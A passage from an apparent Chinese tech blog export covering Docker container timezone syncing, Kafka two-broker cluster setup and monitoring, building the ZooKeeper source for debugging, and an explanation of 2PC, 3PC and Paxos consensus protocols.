<li><p>共享主机的localtime<br>创建容器的时候指定启动参数,挂载localtime文件到容器内,保证两者所采用的时区是一致的.(o是只读的意义)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run --name &lt;name&gt; -v /etc/localtime:/etc/localtime:ro ....</span><br></pre></td></tr></table></figure>
</li>
<li><p>复制主机的localtime  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker cp /etc/localtime containerid:/etc/localtime</span><br></pre></td></tr></table></figure>
</li>
<li><p>软连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai/etc/localtime</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Asia/Shanghai"</span> &gt;/etc/timezone</span><br></pre></td></tr></table></figure>
</li>
</ol>
]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Kafka集群搭建</title>
    <url>/2019/05/23/distributed/Kafka%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h6 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h6><blockquote>
<ul>
<li><p><a href="http://snowxwolf.gitee.io/xwolf.oschina.io/2017/10/25/Hadoop%20HA%20%E6%90%AD%E5%BB%BA/" target="_blank" rel="noopener">zookeeper 集群搭建</a></p>
</li>
<li><p><a href="http://kafka.apache.org/downloads" target="_blank" rel="noopener">kafka 安装包下载</a></p>
</li>
<li><p>java 安装配置</p>
</li>
</ul>
</blockquote>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>本文以 kafka2.12 版本为例来配置,两个 broker 来搭建集群.</p>
<h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><p>主要配置 server.properties,先配置一下两个参数,其他的日志、线程、缓冲区、压缩等先不做配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#保证集群中ID的唯一性，默认为0.</span></span><br><span class="line">broker.id = 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定监听端口,默认9092. listeners = PLAINTEXT://your.host.name:9092</span></span><br><span class="line">listeners=PLAINTEXT://:9093</span><br><span class="line"></span><br><span class="line"><span class="comment">#指定ZK集群</span></span><br><span class="line">zookeeper.connect=hadoop01:2181,hadoop02:2181,hadoop03:2181</span><br></pre></td></tr></table></figure>
<p>注意同一主机区分端口和日志目录,否则集群启动失败.</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="简单的生产者消费者"><a href="#简单的生产者消费者" class="headerlink" title="简单的生产者消费者"></a>简单的生产者消费者</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动kafka</span></span><br><span class="line">./kafka-server-start.sh -daemon   ../config/server.properties</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建topic</span></span><br><span class="line">./kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取topic  列表</span></span><br><span class="line">./kafka-topics.sh --list --zookeeper localhost:2181</span><br><span class="line"></span><br><span class="line"><span class="comment">#生产者发送消息</span></span><br><span class="line">./kafka-console-producer.sh --broker-list localhost:9092,localhost:9093 --topic <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#消费者接收消息</span></span><br><span class="line">./kafka-console-consumer.sh --bootstrap-server localhost:9092,localahost:9093 --from-beginning --topic <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>kafka 启动成功后，执行 jps,可以看到 kafka 进程信息。</p>
<p>生产者发送消息,消费者都可以正常收到消息。</p>
<p><img src="/2019/05/23/distributed/Kafka集群搭建/20190523171150.png" alt></p>
<h3 id="多分区复制"><a href="#多分区复制" class="headerlink" title="多分区复制"></a>多分区复制</h3><p>上边简单的例子只有一个分区,且每份数据保存一份。在分布式系统中如果该分区故障则数据会不可用,这是不能容忍的。需要保留多个分区提供负载均衡且有多份数据.</p>
<h4 id="创建-topic-发送消息"><a href="#创建-topic-发送消息" class="headerlink" title="创建 topic,发送消息"></a>创建 topic,发送消息</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./kafka-topics.sh --create --zookeeper localhost:2181 --replication-factor 2 --partitions 3 --topic test2</span><br></pre></td></tr></table></figure>
<p><img src="/2019/05/23/distributed/Kafka集群搭建/2_20190523155601.png" alt></p>
<p>发送消息也和单分区没有任何区别.</p>
<p><img src="/2019/05/23/distributed/Kafka集群搭建/20190523171703.png" alt></p>
<h1 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h1><p>利用 Kafka Tools 监控 kafka 集群.</p>
<h2 id="安装-Kafka-Tools"><a href="#安装-Kafka-Tools" class="headerlink" title="安装 Kafka Tools"></a>安装 Kafka Tools</h2><p>选择合适的版本,下载<a href="http://www.kafkatool.com/download.html" target="_blank" rel="noopener">Kafka Tools</a>.</p>
<h2 id="连接-kafka-集群"><a href="#连接-kafka-集群" class="headerlink" title="连接 kafka 集群"></a>连接 kafka 集群</h2><p>指定集群名称,zk 地址,broker 地址</p>
<p><img src="/2019/05/23/distributed/Kafka集群搭建/1_20190523154451.png" alt></p>
<p>查看分区中所有数据<br><img src="/2019/05/23/distributed/Kafka集群搭建/20190523171939.png" alt></p>
<p>查看对应分区中的属性信息<br><img src="/2019/05/23/distributed/Kafka集群搭建/pro_20190523172238.png" alt></p>
<p>查看对应分区中的数据<br><img src="/2019/05/23/distributed/Kafka集群搭建/data_20190523172254.png" alt></p>
<p>查看当前分区的复制情况</p>
<p><img src="/2019/05/23/distributed/Kafka集群搭建/rep_20190523172308.png" alt></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://kafka.apache.org" target="_blank" rel="noopener">Kafka 官网</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>大数据</category>
      </categories>
      <tags>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>zookeeper源码分析一之源码环境搭建</title>
    <url>/2019/04/06/distributed/zookeeper%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%80%E4%B9%8B%E6%BA%90%E7%A0%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>本节以zookeer 3.4.14来分析源码,IDE为IDEA,eclipse也可以。</p>
<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><blockquote>
<ul>
<li>jdk1.8</li>
<li>Apache Ant安装配置</li>
<li>Apache Maven安装配置</li>
</ul>
</blockquote>
<a id="more"></a>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="下载编译源码"><a href="#下载编译源码" class="headerlink" title="下载编译源码"></a>下载编译源码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 下载源码</span></span><br><span class="line">$ git <span class="built_in">clone</span> -b branch-3.4.14 https://github.com/apache/zookeeper.git</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> zookeeper</span><br><span class="line"><span class="comment"># ant 编译</span></span><br><span class="line">$ ant </span><br><span class="line"><span class="comment"># 如果有eclispe,编译为eclipse项目</span></span><br><span class="line">$ ant eclipse</span><br></pre></td></tr></table></figure>
<h2 id="导入idea"><a href="#导入idea" class="headerlink" title="导入idea"></a>导入idea</h2><p>idea 导入为maven项目即可.<br>最终的包结构信息:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">D:.</span><br><span class="line">├─.revision</span><br><span class="line">├─bin   命令集合</span><br><span class="line">├─build     ant构建后目录</span><br><span class="line">│  </span><br><span class="line">├─conf   zk配置信息</span><br><span class="line">├─src</span><br><span class="line">│  </span><br><span class="line">├─zookeeper-client  C客户端</span><br><span class="line">│  └─zookeeper-client-c</span><br><span class="line">│      </span><br><span class="line">├─zookeeper-contrib  贡献工具集合</span><br><span class="line">│  ├─zookeeper-contrib-fatjar  fatjar</span><br><span class="line">│  │  </span><br><span class="line">│  ├─zookeeper-contrib-huebrowser   zkui图形化工具</span><br><span class="line">│  │ </span><br><span class="line">│  ├─zookeeper-contrib-loggraph  日志查看和过滤工具</span><br><span class="line"></span><br><span class="line">│  ├─zookeeper-contrib-monitoring  监控工具</span><br><span class="line">│  │ </span><br><span class="line">│  ├─zookeeper-contrib-rest rest接口</span><br><span class="line">│  │  </span><br><span class="line">│  ├─zookeeper-contrib-zkfuse  zkfuse工具,将zk挂载到文件系统</span><br><span class="line">│  │  └─src</span><br><span class="line">│  ├─zookeeper-contrib-zkperl  perl客户端</span><br><span class="line">│  │  </span><br><span class="line">│  ├─zookeeper-contrib-zkpython  python 客户端</span><br><span class="line">│  │  </span><br><span class="line">│  ├─zookeeper-contrib-zktreeutil  zookeeper 操作工具</span><br><span class="line">│  │  </span><br><span class="line">│  └─zookeeper-contrib-zooinspector inspector工具</span><br><span class="line">│     </span><br><span class="line">├─zookeeper-docs   zookeeper文档</span><br><span class="line">│  </span><br><span class="line">├─zookeeper-it   测试</span><br><span class="line">│  </span><br><span class="line">├─zookeeper-jute  jute序列化</span><br><span class="line">│  </span><br><span class="line">├─zookeeper-recipes  zk选举、锁和队列</span><br><span class="line">│  ├─zookeeper-recipes-election</span><br><span class="line">│  </span><br><span class="line">│  ├─zookeeper-recipes-lock</span><br><span class="line">│  </span><br><span class="line">│  └─zookeeper-recipes-queue</span><br><span class="line">│     </span><br><span class="line">└─zookeeper-server  zk server</span><br></pre></td></tr></table></figure></p>
<p>各个模块的结构还是很清晰的,不做过多解释.</p>
<h2 id="启动server"><a href="#启动server" class="headerlink" title="启动server"></a>启动server</h2><p>查看zkServer.sh 文件,可以看到server main入口.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># for some reason these two options are necessary on jdk6 on Ubuntu</span></span><br><span class="line">   <span class="comment">#   accord to the docs they are not necessary, but otw jconsole cannot</span></span><br><span class="line">   <span class="comment">#   do a local attach</span></span><br><span class="line">   ZOOMAIN=<span class="string">"-Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.local.only=<span class="variable">$JMXLOCALONLY</span> org.apache.zookeeper.server.quorum.QuorumPeerMain"</span></span><br></pre></td></tr></table></figure>
<p>指定zoo.cfg配置文件,运行<br>org.apache.zookeeper.server.quorum.QuorumPeerMain.<br><img src="/2019/04/06/distributed/zookeeper源码分析一之源码环境搭建/zk_20190406133545.png" alt><br>,看到日志信息的输出，表示启动成功，当然是单节点的。<br><img src="/2019/04/06/distributed/zookeeper源码分析一之源码环境搭建/zk_20190406114820.png" alt></p>
<h2 id="启动-client"><a href="#启动-client" class="headerlink" title="启动 client"></a>启动 client</h2><p>直接启动org.apache.zookeeper.ZooKeeperMain.<br>也可正常启动.<br><img src="/2019/04/06/distributed/zookeeper源码分析一之源码环境搭建/zk_20190406115341.png" alt></p>
<p>到此,zookeerp源码的调试环境已经ok。</p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>zookeeper</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式一致性协议</title>
    <url>/2017/12/21/distributed/%E5%88%86%E5%B8%83%E5%BC%8F%E4%B8%80%E8%87%B4%E6%80%A7%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>本文主要讲述2PC及3PC，以及Paxos以及Raft协议。</p>
<p>两类一致性(操作原子性与副本一致性)<br>2PC协议用于保证属于多个数据分片上的操作的原子性。这些数据分片可能分布在不同的服务器上，2PC协议保证多台服务器上的操作要么全部成功，要么全部失败。<br>Paxos协议用于保证同一个数据分片的多个副本之间的数据一致性。当这些副本分布到不同的数据中心时，这个需求尤其强烈。</p>
<blockquote>
<h1 id="一、2PC（阻塞、数据不一致问题、单点问题）"><a href="#一、2PC（阻塞、数据不一致问题、单点问题）" class="headerlink" title="一、2PC（阻塞、数据不一致问题、单点问题）"></a>一、2PC（阻塞、数据不一致问题、单点问题）</h1></blockquote>
<p> <img src="https://i.imgur.com/06KGQ2x.png" alt></p>
<p>Two-Phase Commit，两阶段提交</p>
<blockquote>
<h2 id="阶段一：提交事务请求（投票阶段）"><a href="#阶段一：提交事务请求（投票阶段）" class="headerlink" title="阶段一：提交事务请求（投票阶段）"></a>阶段一：提交事务请求（投票阶段）</h2></blockquote>
<p>（1）事务询问</p>
<p>协调者向所有的参与者发送事务内容，询问是否可以执行事务提交操作，并开始等待各参与者的响应</p>
<p>（2）执行事务</p>
<p>各参与者节点执行事务操作，并将Undo和Redo信息计入事务日志中</p>
<p>（3）各参与者向协调者反馈事务询问的响应</p>
<p>如果参与者成功执行了事务操作，那么就反馈给协调者Yes响应，表示事务可以执行；如果参与者没有成功执行事务，那么就反馈给协调者No响应，表示事务不可以执行。</p>
<blockquote>
<h2 id="阶段二：执行事务提交（执行阶段）"><a href="#阶段二：执行事务提交（执行阶段）" class="headerlink" title="阶段二：执行事务提交（执行阶段）"></a>阶段二：执行事务提交（执行阶段）</h2></blockquote>
<p>（1）执行事务提交</p>
<p>如果所有参与者的反馈都是Yes响应，那么<br>A、发送提交请求<br>协调者向所有参与者节点发出Commit请求<br>B、事务提交<br>参与者接收到Commit请求后，会正式执行事务提交操作，并在完成提交之后释放在整个事务执行期间占用的事务资源<br>C、反馈事务提交结果<br>参与者在完成事务提交之后，向协调者发送ACK信息<br>D、完成事务<br>  协调者接收到所有参与者反馈的ACK消息后，完成事务。</p>
<p>（2）中断事务</p>
<p>任何一个参与者反馈了No响应，或者在等待超时之后，协调者尚无法接收到所有参与者的反馈响应，那么就会中断事务。<br>A、发送回滚请求<br>协调者向所有参与者节点发出Rollback请求<br>B、事务回滚<br>参与者接收到rollback请求后，会利用其在阶段一中记录的Undo信息来执行事务回滚操作，并在完成回滚之后释放整个事务执行期间占用的资源<br>C、反馈事务回滚结果<br>参与者在完成事务回滚之后，向协调者发送ACK信息<br>D、中断事务<br>   协调者接收到所有参与者反馈的ACK信息后，完成事务中断</p>
<p>优缺点</p>
<p>优点：原理简单、实现方便<br>缺点：同步阻塞、单点问题、数据不一致、太过保守<br>（1）同步阻塞<br>同步阻塞会极大地限制分布式系统的性能。在二阶段提交的执行过程中，所有参与该事务操作的逻辑都处于阻塞状态，各个参与者在等待其他参与者响应的过程中，将无法进行其他任何操作。<br>（2）单点问题<br>一旦协调者出现问题，那么整个二阶段提交流程将无法运转，更为严重的是，如果是在阶段二中出现问题，那么其他参与者将会一直处于锁定事务资源的状态中，无法继续完成事务操作。<br>（3）数据不一致<br>在阶段二，当协调者向所有参与者发送commit请求之后，发生了局部网络异常或协调者在尚未发完commit请求之前自身发生了崩溃，导致最终只有部分参与者接收到了commit请求，于是这部分参与者执行事务提交，而没收到commit请求的参与者则无法进行事务提交，于是整个分布式系统出现了数据不一致性现象。<br>（4）太过保守<br>如果参与者在与协调者通信期间出现故障，协调者只能靠超时机制来判断是否需要中断事务，这个策略比较保守，需要更为完善的容错机制，任意一个节点的失败都会导致整个事务的失败。</p>
<blockquote>
<h1 id="二、3PC（解决2PC的阻塞，但还是可能造成数据不一致）"><a href="#二、3PC（解决2PC的阻塞，但还是可能造成数据不一致）" class="headerlink" title="二、3PC（解决2PC的阻塞，但还是可能造成数据不一致）"></a>二、3PC（解决2PC的阻塞，但还是可能造成数据不一致）</h1></blockquote>
<p>Three-Phase Commit，三阶段提交，分为CanCommit、PreCommit、do Commit三个阶段。</p>
<p>为了避免在通知所有参与者提交事务时，其中一个参与者crash不一致时，就出现了三阶段提交的方式。三阶段提交在两阶段提交的基础上增加了一个preCommit的过程，当所有参与者收到preCommit后，并不执行动作，直到收到commit或超过一定时间后才完成操作。<br><img src="https://i.imgur.com/8VsJpXv.png" alt></p>
<blockquote>
<h2 id="阶段一、CanCommit"><a href="#阶段一、CanCommit" class="headerlink" title="阶段一、CanCommit"></a>阶段一、CanCommit</h2></blockquote>
<p>（1）事务询问<br>协调者向各参与者发送CanCommit的请求，询问是否可以执行事务提交操作，并开始等待各参与者的响应</p>
<p>（2）参与者向协调者反馈询问的响应<br>参与者收到CanCommit请求后，正常情况下，如果自身认为可以顺利执行事务，那么会反馈Yes响应，并进入预备状态，否则反馈No。</p>
<blockquote>
<h2 id="阶段二、PreCommit"><a href="#阶段二、PreCommit" class="headerlink" title="阶段二、PreCommit"></a>阶段二、PreCommit</h2></blockquote>
<p>（1）执行事务预提交<br>如果协调者接收到各参与者反馈都是Yes，那么执行事务预提交</p>
<p>A、发送预提交请求<br>协调者向各参与者发送preCommit请求，并进入prepared阶段</p>
<p>B、事务预提交<br>参与者接收到preCommit请求后，会执行事务操作，并将Undo和Redo信息记录到事务日记中</p>
<p>C、各参与者向协调者反馈事务执行的响应<br>如果各参与者都成功执行了事务操作，那么反馈给协调者Ack响应，同时等待最终指令，提交commit或者终止abort<br>（2）中断事务</p>
<p>如果任何一个参与者向协调者反馈了No响应，或者在等待超时后，协调者无法接收到所有参与者的反馈，那么就会中断事务。</p>
<p>A、发送中断请求<br>  协调者向所有参与者发送abort请求<br>B、中断事务<br>   无论是收到来自协调者的abort请求，还是等待超时，参与者都中断事务</p>
<blockquote>
<h2 id="阶段三、doCommit"><a href="#阶段三、doCommit" class="headerlink" title="阶段三、doCommit"></a>阶段三、doCommit</h2></blockquote>
<p>（1）执行提交</p>
<p>A、发送提交请求<br>假设协调者正常工作，接收到了所有参与者的ack响应，那么它将从预提交阶段进入提交状态，并向所有参与者发送doCommit请求<br>B、事务提交<br>参与者收到doCommit请求后，正式提交事务，并在完成事务提交后释放占用的资源<br>C、反馈事务提交结果<br>参与者完成事务提交后，向协调者发送ACK信息<br>D、完成事务<br>协调者接收到所有参与者ack信息，完成事务</p>
<p>（2）中断事务</p>
<p>假设协调者正常工作，并且有任一参与者反馈No，或者在等待超时后无法接收所有参与者的反馈，都会中断事务</p>
<p>A、发送中断请求<br>协调者向所有参与者节点发送abort请求<br>B、事务回滚<br>参与者接收到abort请求后，利用undo日志执行事务回滚，并在完成事务回滚后释放占用的资源<br>C、反馈事务回滚结果<br>参与者在完成事务回滚之后，向协调者发送ack信息<br>D、中断事务<br>协调者接收到所有参与者反馈的ack信息后，中断事务。<br>阶段三可能出现的问题：<br>协调者出现问题、协调者与参与者之间网络出现故障。不论出现哪种情况，最终都会导致参与者无法及时接收到来自协调者的doCommit或是abort请求，针对这种情况，参与者都会在等待超时后，继续进行事务提交（timeout后中断事务）。</p>
<p>优点：降低参与者阻塞范围，并能够在出现单点故障后继续达成一致<br>缺点：引入preCommit阶段，在这个阶段如果出现网络分区，协调者无法与参与者正常通信，参与者依然会进行事务提交，造成数据不一致。</p>
<blockquote>
<h1 id="三、Paxos（解决单点问题）"><a href="#三、Paxos（解决单点问题）" class="headerlink" title="三、Paxos（解决单点问题）"></a>三、Paxos（解决单点问题）</h1><h5 id="Paxos简介"><a href="#Paxos简介" class="headerlink" title="Paxos简介"></a>Paxos简介</h5></blockquote>
<p>Paxos算法是莱斯利·兰伯特（英语：Leslie Lamport，LaTeX中的“La”）于1990年提出的一种基于消息传递且具有高度容错特性的一致性算法。</p>
<p>拜占庭将军问题（Byzantine Generals Problem),是由莱斯利·兰波特在其同名论文中提出的分布式对等网络通信容错问题。<br>在分布式计算中，不同的计算机通过通讯交换信息达成共识而按照同一套协作策略行动。但有时候，系统中的成员计算机可能出错而发送错误的信息，用于传递信息的通讯网络也可能导致信息损坏，使得网络中不同的成员关于全体协作的策略得出不同结论，从而破坏系统一致性。拜占庭将军问题被认为是容错性问题中最难的问题类型之一。</p>
<p>莱斯利·兰波特在其论文中描述了如下问题：<br>一组拜占庭将军分别各率领一支军队共同围困一座城市。为了简化问题，将各支军队的行动策略限定为进攻或撤离两种。因为部分军队进攻部分军队撤离可能会造成灾难性后果，因此各位将军必须通过投票来达成一致策略，即所有军队一起进攻或所有军队一起撤离。因为各位将军分处城市不同方向，他们只能通过信使互相联系。在投票过程中每位将军都将自己投票给进攻还是撤退的信息通过信使分别通知其他所有将军，这样一来每位将军根据自己的投票和其他所有将军送来的信息就可以知道共同的投票结果而决定行动策略。<br>系统的问题在于，将军中可能出现叛徒，他们不仅可能向较为糟糕的策略投票，还可能选择性地发送投票信息。假设有9位将军投票，其中1名叛徒。8名忠诚的将军中出现了4人投进攻，4人投撤离的情况。这时候叛徒可能故意给4名投进攻的将领送信表示投票进攻，而给4名投撤离的将领送信表示投撤离。这样一来在4名投进攻的将领看来，投票结果是5人投进攻，从而发起进攻；而在4名投撤离的将军看来则是5人投撤离。这样各支军队的一致协同就遭到了破坏。<br>由于将军之间需要通过信使通讯，叛变将军可能通过伪造信件来以其他将军的身份发送假投票。而即使在保证所有将军忠诚的情况下，也不能排除信使被敌人截杀，甚至被敌人间谍替换等情况。因此很难通过保证人员可靠性及通讯可靠性来解决问题。<br>假始那些忠诚（或是没有出错）的将军仍然能通过多数决来决定他们的战略，便称达到了拜占庭容错。在此，票都会有一个默认值，若消息（票）没有被收到，则使用此默认值来投票。<br>上述的故事映射到计算机系统里，将军便成了计算机，而信差就是通信系统。虽然上述的问题涉及了电子化的决策支持与信息安全，却没办法单纯的用密码学与数字签名来解决。因为不正常的电压仍可能影响整个加密过程，这不是密码学与数字签名算法在解决的问题。因此计算机就有可能将错误的结果提交去，亦可能导致错误的决策。</p>
<p>分布式系统中的节点通信存在两种模型：共享内存（Shared memory）和消息传递（Messages passing）。基于消息传递通信模型的分布式系统，不可避免的会发生以下错误：进程可能会慢、被杀死或者重启，消息可能会延迟、丢失、重复，在基础Paxos场景中，先不考虑可能出现消息篡改即拜占庭错误的情况。Paxos算法解决的问题是在一个可能发生上述异常的分布式系统中如何就某个值达成一致，保证不论发生以上任何异常，都不会破坏决议的一致性。一个典型的场景是，在一个分布式数据库系统中，如果各节点的初始状态一致，每个节点都执行相同的操作序列，那么他们最后能得到一个一致的状态。为保证每个节点执行相同的命令序列，需要在每一条指令上执行一个“一致性算法”以保证每个节点看到的指令一致。一个通用的一致性算法可以应用在许多场景中，是分布式计算中的重要问题。因此从20世纪80年代起对于一致性算法的研究就没有停止过。<br>为描述Paxos算法,Lamport虚拟了一个叫做Paxos的希腊城邦,这个岛按照议会民主制的政治模式制订法律,但是没有人愿意将自己的全部时间和精力放在这种事情上.所以无论是议员,议长或者传递纸条的服务员都不能承诺别人需要时一定会出现，也无法承诺批准决议或者传递消息的时间。但是这里假设没有拜占庭将军问题（Byzantine failure，即虽然有可能一个消息被传递了两次，但是绝对不会出现错误的消息）；只要等待足够的时间,消息就会被传到。另外，Paxos岛上的议员是不会反对其他议员提出的决议的。<br>对应于分布式系统,议员对应于各个节点,制定的法律对应于系统的状态.各个节点需要进入一个一致的状态,例如在独立Cache的对称多处理器系统中,各个处理器读内存的某个字节时,必须读到同样的一个值,否则系统就违背了一致性的要求.一致性要求对应于法律条文只能有一个版本.议员和服务员的不确定性对应于节点和消息传递通道的不可靠性.</p>
<blockquote>
<h4 id="Paxos推导"><a href="#Paxos推导" class="headerlink" title="Paxos推导"></a>Paxos推导</h4></blockquote>
<p>一致性的要求如下：</p>
<blockquote>
<ul>
<li>1.决议（value）只有在被proposers提出后才能被批准（未经批准的决议称为“提案（proposal）”）；</li>
<li>2.在一次Paxos算法的执行实例中，只批准（chosen）一个value；</li>
<li>3.learners只能获得被批准（chosen）的value。</li>
</ul>
</blockquote>
<p>Paxos算法把参与者分成三个角色：Proposers,Acceptors,Learners（注：允许一个参与者扮演多个角色）。Proposers会发出预提案（prepare request, proposal number），提出提案(accept request proposal, proposal)。Acceptor可以回复（respond）预提案，可以接受提案。当提案获得多数acceptors接受后，则该提案被批准（chosen)。Learner可以‘学习’被批准的提案。</p>
<p>如果只有一个Acceptors,它收到的第一个提案就作为选定的提案。这样虽然简单,但是如果这一个Acceptor挂掉,整个系统就不能用了。如下图所示:<br><img src="https://i.imgur.com/zZLH0sk.png" alt><br>因此需要有多个Acceptors来接收提案，来避免Acceptors单点问题。</p>
<p>批准value的过程中，首先proposers将value发送给acceptors，之后acceptors对value进行接受（accept）。为了满足只批准一个value的约束，要求经“多数派（majority）”接受的value成为正式的决议（称为“批准”决议）。这是因为无论是按照人数还是按照权重划分，两组“多数派”至少有一个公共的acceptor，如果每个acceptor只能接受一个value，约束2就能保证。<br>于是产生了一个显而易见的新约束：</p>
<blockquote>
<ul>
<li>P1：一个acceptor必须接受（accept）第一次收到的提案。</li>
</ul>
</blockquote>
<p>但是P1约束是不完备的。如果恰好一半acceptor接受的提案具有value A，另一半接受的提案具有value B，那么就无法形成多数派,无法批准任何一个value。如下图所示:</p>
<p><img src="https://i.imgur.com/tfDxNuh.png" alt></p>
<p>三个Proposer(P1,P2,P3)分别将各自不同的提案1，2，3发送给不同的Acceptors(A1,A2,A3),并且同时被Accetpors接受。但是没有一个提案是被多个Acceptos接受。虽然满足P1约束,但是却无法选定提案。</p>
<p>如下图所示,虽然有多个Acceptors接收多个提案,但当Acceptors A5 宕机后。提案1、2的批准者都是2(接收P1和P2提案的Acceptos的数量),因此也无法最终选举出提案。<br><img src="https://i.imgur.com/hsEl3ia.png" alt></p>
<p>因此,在P1的基础上再加上一个提案被选定需要半数以上的Acceptor批准的需求,暗示一个Acceptor必须能够批准不止一个提案。于是就有新的约束P2:</p>
<blockquote>
<ul>
<li>P2：一旦一个具有value v的提案被批准（chosen），那么之后批准（chosen）的提案必须具有value v。</li>
</ul>
</blockquote>
<p>注：通过某种方法可以为每个提案分配一个编号，在提案之间建立一个全序关系，所谓“之后”都是指所有编号更大的提案。<br>如果P1和P2都能够保证，那么约束2就能够保证。<br>批准一个value意味着多个acceptor接受（accept）了该value.因此，可以对P2进行加强：</p>
<blockquote>
<ul>
<li>P2a：一旦一个具有value v的提案被批准（chosen），那么之后任何acceptor再次接受（accept）的提案必须具有value v。</li>
</ul>
</blockquote>
<p>由于通信是异步的，P2a和P1会发生冲突。如果一个value被批准后，一个proposer和一个acceptor从休眠中苏醒，前者提出一个具有新的value的提案。根据P1，后者应当接受，根据P2a，则不应当接受，这中场景下P2a和P1有矛盾。于是需要换个思路，转而对proposer的行为进行约束：</p>
<blockquote>
<ul>
<li>P2b：一旦一个具有value v的提案被批准（chosen），那么以后任何proposer提出的提案必须具有value v。</li>
</ul>
</blockquote>
<p>由于acceptor能接受的提案都必须由proposer提出，所以P2b蕴涵了P2a，是一个更强的约束。<br>但是根据P2b难以提出实现手段。因此需要进一步加强P2b。<br>假设一个编号为m的value v已经获得批准（chosen），来看看在什么情况下对任何编号为n（n&gt;m）的提案都含有value v。因为m已经获得批准（chosen），显然存在一个acceptors的多数派C，他们都接受（accept）了v。考虑到任何多数派都和C具有至少一个公共成员，可以找到一个蕴涵P2b的约束P2c：</p>
<blockquote>
<ul>
<li>P2c：如果一个编号为n的提案具有value v，那么存在一个多数派，要么他们中所有人都没有接受（accept）编号小于n<br>的任何提案，要么他们已经接受（accept）的所有编号小于n的提案中编号最大的那个提案具有value v。</li>
</ul>
</blockquote>
<p>可以用数学归纳法证明P2c蕴涵P2b：<br>假设具有value v的提案m获得批准，当n=m+1时，采用反证法，假如提案n不具有value v，而是具有value w，根据P2c，则存在一个多数派S1，要么他们中没有人接受过编号小于n的任何提案，要么他们已经接受的所有编号小于n的提案中编号最大的那个提案是value w。由于S1和通过提案m时的多数派C之间至少有一个公共的acceptor，所以以上两个条件都不成立，导出矛盾从而推翻假设，证明了提案n必须具有value v；<br>若（m+1）..（N-1）所有提案都具有value v，采用反证法，假如新提案N不具有value v，而是具有value w’,根据P2c，则存在一个多数派S2，要么他们没有接受过m..（N-1）中的任何提案，要么他们已经接受的所有编号小于N的提案中编号最大的那个提案是value w’。由于S2和通过m的多数派C之间至少有一个公共的acceptor，所以至少有一个acceptor曾经接受了m，从而也可以推出S2中已接受的所有编号小于n的提案中编号最大的那个提案的编号范围在m..（N-1）之间，而根据初始假设，m..（N-1）之间的所有提案都具有value v，所以S2中已接受的所有编号小于n的提案中编号最大的那个提案肯定具有value v，导出矛盾从而推翻新提案n不具有value v的假设。根据数学归纳法，我们证明了若满足P2c，则P2b一定满足。<br>P2c是可以通过消息传递模型实现的。另外，引入了P2c后，也解决了前文提到的P1不完备的问题。</p>
<p><strong>算法的内容</strong><br>要满足P2c的约束，proposer提出一个提案前，首先要和足以形成多数派的acceptors进行通信，获得他们进行的最近一次接受（accept）的提案（prepare过程），之后根据回收的信息决定这次提案的value，形成提案开始投票。当获得多数acceptors接受（accept）后，提案获得批准（chosen），由proposer将这个消息告知learner。这个简略的过程经过进一步细化后就形成了Paxos算法。</p>
<p>在一个paxos实例中，每个提案需要有不同的编号，且编号间要存在全序关系。可以用多种方法实现这一点，例如将序数和proposer的名字拼接起来。如何做到这一点不在Paxos算法讨论的范围之内。<br>如果一个没有chosen过任何proposer提案的acceptor在prepare过程中回答了一个proposer针对提案n的问题，但是在开始对n进行投票前，又接受（accept）了编号小于n的另一个提案（例如n-1），如果n-1和n具有不同的value，这个投票就会违背P2c。因此在prepare过程中，acceptor进行的回答同时也应包含承诺：不会再接受（accept）编号小于n的提案。这是对P1的加强：</p>
<blockquote>
<ul>
<li>P1a：当且仅当acceptor没有回应过编号大于n的prepare请求时，acceptor接受（accept）编号为n的提案。<br>现在已经可以提出完整的算法了。</li>
</ul>
</blockquote>
<p>决议的提出与批准<br>通过一个决议分为两个阶段：</p>
<blockquote>
<h2 id="prepare阶段"><a href="#prepare阶段" class="headerlink" title="prepare阶段:"></a>prepare阶段:</h2><ul>
<li>proposer选择一个提案编号n并将prepare请求发送给acceptors中的一个多数派；</li>
